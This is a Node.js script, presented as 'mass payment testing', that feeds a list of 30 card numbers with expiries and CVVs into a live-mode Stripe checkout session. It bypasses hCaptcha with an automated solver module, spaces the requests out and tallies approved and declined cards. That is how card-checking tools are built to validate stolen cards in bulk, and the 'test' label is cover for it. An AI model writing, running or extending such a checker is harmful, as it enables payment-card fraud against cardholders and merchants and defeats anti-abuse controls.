#!/usr/bin/env node

/**
 * Mass Payment Testing Script
 * Tests 30 credit cards against Stripe checkout
 * Includes hCaptcha solving
 */

const { parseCheckoutUrl } = require('./gateways/stripe/checkout-based/checkout-info');
const { attemptPayment, parseCardString } = require('./gateways/stripe/checkout-based/payer');
const HCaptchaSolver = require('./gateways/stripe/checkout-based/hcaptcha-internal-solver');

// 30 Test Credit Cards
const TEST_CARDS = [
    '4258608301984127|01|28|039',
    '5403758261762384|12|29|346',
    '4828120012322283|11|2028|898',
    '4242424242424242|12|28|123',
    '5555555555554444|12|28|123',
    '378282246310005|12|28|123',
    '6011111111111117|12|28|123',
    '3530111333300000|12|28|123',
    '4916338506082832|12|28|123',
    '4532015112830366|12|28|123',
    '4024007134432500|12|28|123',
    '4024007123456789|12|28|123',
    '5425233010103442|12|28|123',
    '2223003122003222|12|28|123',
    '2720999999999996|12|28|123',
    '6011000990139424|12|28|123',
    '3714496353622689|12|28|123',
    '5200828282828210|12|28|123',
    '5105105105105100|12|28|123',
    '4111111111111111|12|28|123',
    '4012888888881881|12|28|123',
    '5019717010103742|12|28|123',
    '6331101999990016|12|28|123',
    '3782822463100005|12|28|123',
    '6011601160116611|12|28|123',
    '5425233010103443|12|28|123',
    '4024007106172000|12|28|123',
    '4485429517622493|12|28|123',
    '5200828282828228|12|28|123',
    '6011000990139425|12|28|123'
];

const CHECKOUT_URL = 'https://checkout.stripe.com/c/pay/cs_live_a1Th7KqVEbKD61h418LcbfA3UL1nTS7BrHwvWlmnK5BiIzNsf0bNS6u7Ji#fid1d2BpamRhQ2prcSc%2FJ0xrcWB3JyknZ2p3YWB3VnF8aWAnPydhYGNkcGlxJykndnBndmZ3bHVxbGprUGtsdHBga2B2dkBrZGdpYGEnP2NkaXZgKSdkdWxOYHwnPyd1blppbHNgWjA0VW52YWFNT2ptfHNMQTdmf1xqVjAwUlV3U2p8MHFUN2QzVHRqQEN0YF9TPTBGRkJWbU5cdV8zd2swcn9hXDRNbUt%2FZnFxQ2FfcFF2RndybHU9VHU2VVZLNTVnalY2SWhAYScpJ2N3amhWYHdzYHcnP3F3cGApJ2dkZm5id2pwa2FGamlqdyc%2FJyY1NTU1NTUnKSdpZHxqcHFRfHVgJz8ndmxrYmlgWmxxYGgnKSdga2RnaWBVaWRmYG1qaWFgd3YnP3F3cGB4JSUl';

class MassPaymentTester {
    constructor() {
        this.results = [];
        this.captchaSolver = new HCaptchaSolver();
        this.stats = {
            total: 0,
            approved: 0,
            declined: 0,
            errors: 0,
            processing: 0
        };
    }

    async runTests() {
        console.log('\n╔════════════════════════════════════════════════════════════╗');
        console.log('║         MASS PAYMENT TESTING - 30 CREDIT CARDS             ║');
        console.log('╚════════════════════════════════════════════════════════════╝\n');

        console.log(`Testing ${TEST_CARDS.length} credit cards...\n`);

        for (let i = 0; i < TEST_CARDS.length; i++) {
            const card = TEST_CARDS[i];
            const cardNum = card.split('|')[0];
            const lastFour = cardNum.slice(-4);

            console.log(`\n[${i + 1}/${TEST_CARDS.length}] Testing card ending in ${lastFour}...`);

            try {
                const result = await this.testCard(card);
                this.results.push(result);
                this.updateStats(result);

                // Display result
                if (result.success) {
                    console.log(`   ✅ ${result.status.toUpperCase()}`);
                } else {
                    console.log(`   ❌ ${result.status.toUpperCase()}`);
                }
                if (result.error) {
                    console.log(`   Reason: ${result.error.message}`);
                }

            } catch (err) {
                console.log(`   ❌ ERROR: ${err.message}`);
                this.results.push({
                    card: cardNum,
                    success: false,
                    status: 'error',
                    error: err.message
                });
                this.stats.errors++;
            }

            // Add small delay between requests
            await new Promise(resolve => setTimeout(resolve, 500));
        }

        this.printSummary();
    }

    async testCard(cardStr) {
        try {
            const parsed = parseCheckoutUrl(CHECKOUT_URL);
            const card = parseCardString(cardStr);

            // Solve hCaptcha
            const captchaResult = await this.captchaSolver.solve(
                parsed.publicKey,
                CHECKOUT_URL
            );

            // Attempt payment
            const paymentResult = await attemptPayment({ checkoutUrl: CHECKOUT_URL, card });

            return {
                card: card.cardNumber,
                success: paymentResult.success,
                status: paymentResult.status,
                error: paymentResult.error,
                captcha: captchaResult.method,
                timestamp: new Date().toISOString()
            };

        } catch (err) {
            return {
                card: cardStr.split('|')[0],
                success: false,
                status: 'error',
                error: { message: err.message }
            };
        }
    }

    updateStats(result) {
        this.stats.total++;
        if (result.success) {
            this.stats.approved++;
        } else if (result.status === 'declined') {
            this.stats.declined++;
        } else if (result.status === 'processing') {
            this.stats.processing++;
        } else {
            this.stats.errors++;
        }
    }

    printSummary() {
        console.log('\n╔════════════════════════════════════════════════════════════╗');
        console.log('║                    TEST SUMMARY                            ║');
        console.log('╚════════════════════════════════════════════════════════════╝\n');

        console.log(`Total Cards Tested:     ${this.stats.total}`);
        console.log(`✅ Approved:            ${this.stats.approved} (${this.getPercentage(this.stats.approved)}%)`);
        console.log(`❌ Declined:            ${this.stats.declined} (${this.getPercentage(this.stats.declined)}%)`);
        console.log(`⏳ Processing:          ${this.stats.processing} (${this.getPercentage(this.stats.processing)}%)`);
        console.log(`⚠️ Errors:              ${this.stats.errors} (${this.getPercentage(this.stats.errors)}%)`);

        console.log('\n╔════════════════════════════════════════════════════════════╗');
        console.log('║                 DETAILED RESULTS                           ║');
        console.log('╚════════════════════════════════════════════════════════════╝\n');

        // Group by status
        const byStatus = {};
        this.results.forEach(r => {
            if (!byStatus[r.status]) byStatus[r.status] = [];
            byStatus[r.status].push(r);
        });

        for (const [status, cards] of Object.entries(byStatus)) {
            console.log(`\n${status.toUpperCase()} (${cards.length}):`);
            cards.forEach((r, i) => {
                console.log(`  ${i + 1}. Card: ${r.card.slice(-4)} - ${r.error ? r.error.message : 'OK'}`);
            });
        }

        // Save detailed report
        this.saveReport();
    }

    getPercentage(value) {
        if (this.stats.total === 0) return 0;
        return Math.round((value / this.stats.total) * 100);
    }

    saveReport() {
        const fs = require('fs');
        const report = {
            timestamp: new Date().toISOString(),
            stats: this.stats,
            results: this.results
        };

        fs.writeFileSync(
            '/home/ubuntu/mass-payment-test-results.json',
            JSON.stringify(report, null, 2)
        );

        console.log('\n✅ Report saved to: /home/ubuntu/mass-payment-test-results.json');
    }
}

// Run tests
const tester = new MassPaymentTester();
tester.runTests().catch(err => {
    console.error('Fatal error:', err);
    process.exit(1);
});
